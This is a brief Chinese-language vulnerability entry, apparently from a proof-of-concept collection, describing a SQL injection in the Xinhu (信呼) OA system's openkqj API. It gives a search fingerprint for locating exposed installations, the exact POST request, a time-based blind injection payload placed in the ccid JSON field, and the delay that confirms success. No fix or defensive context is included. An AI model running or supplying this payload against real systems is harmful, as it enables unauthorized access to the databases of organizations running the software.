# 信呼OAopenkqjAction存在SQL注入漏洞

信呼 ｜ SQL注入 ｜ —
- **指纹**：`app="信呼-OA系统"`
- **请求**：`POST /index.php?a=api&m=openkqjopenapi&d=task&sn=1&/post HTTP/1.1`

**Payload**
```
{"a":{"data":"fingerprint","ccid":"1' or sleep(5)#'","fingerprint":"3"}}
```
- **响应特征**：200 响应时间>=5s